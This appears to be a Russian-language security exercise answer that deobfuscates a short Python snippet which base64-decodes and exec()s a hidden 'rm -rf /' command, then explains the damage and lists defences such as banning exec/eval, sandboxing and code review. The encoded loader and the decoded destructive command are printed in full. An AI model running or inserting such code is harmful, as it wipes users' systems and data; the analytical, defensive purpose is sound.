# Анализ деобфускации кода

## Исходный обфусцированный код:

```python
a = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
import base64
b = base64.b64decode(a).decode('utf-8')
exec(b)
```


## 3.1. Расшифрованная строка:

```python
import os; os.system('rm -rf /')
```



## 3.2. Анализ угрозы:

### Что делает команда `rm -rf /`:
- `rm` — команда удаления файлов в Linux/Unix
- `-r` — рекурсивное удаление (все подпапки и файлы)
- `-f` — принудительное удаление (без подтверждения)
- `/` — корневая директория файловой системы

### Последствия выполнения:
1. **ПОЛНОЕ УДАЛЕНИЕ ВСЕЙ ФАЙЛОВОЙ СИСТЕМЫ** — удаляются все файлы на диске
2. Удаление операционной системы и всех программ
3. Невозможность загрузки системы
4. **ПОЛНАЯ ПОТЕРЯ ВСЕХ ДАННЫХ** без возможности восстановления

### Как работает атака:
1. Злоумышленник кодирует опасную команду в Base64
2. Скрипт декодирует строку функцией `base64.b64decode()`
3. Функция `exec()` выполняет декодированный код как Python-код
4. Система выполняет команду `rm -rf /` и удаляет всё



## 3.3. Методы защиты:

1. **Запрет функций `exec()` и `eval()`** — не выполнять динамический код из ненадежных источников
2. **Валидация входных данных** — проверять все строки перед выполнением
3. **Статический анализ кода** — использовать линтеры для поиска подозрительных паттернов (например, использование `exec`, `base64`, `os.system`)
4. **Запуск с минимальными привилегиями** — не запускать скрипты от root/admin
5. **Белые списки команд** — разрешать только безопасные команды
6. **Песочница (sandbox)** — выполнять недоверенный код в изолированной среде
7. **Code Review** — проверка кода перед выполнением
